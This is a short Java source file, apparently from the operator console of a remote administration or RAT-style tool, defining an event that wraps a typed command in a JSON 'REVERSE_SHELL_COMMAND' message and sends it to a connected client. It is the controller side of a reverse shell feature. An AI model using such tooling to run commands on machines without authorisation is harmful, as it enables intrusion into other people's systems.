package GUI.TableUtils.ReverseShell.Events;

import GUI.TableUtils.ReverseShell.ReverseShellGUI;
import Information.AbstractEvent;
import org.json.JSONObject;

import java.io.IOException;


public class CommadEvent extends AbstractEvent<ReverseShellGUI> {

    private final String command;
    public CommadEvent(ReverseShellGUI reverseShellGUI, String command) {
        super(reverseShellGUI);
        this.command = command;
    }

    @Override
    public void run() {
        JSONObject jsonObject = new JSONObject();
        jsonObject.put("ACTION","REVERSE_SHELL_COMMAND");
        jsonObject.put("command", command);
        try {
            getClient().sendString(jsonObject.toString());
        } catch (IOException e) {
            throw new RuntimeException(e);
        }
    }
}
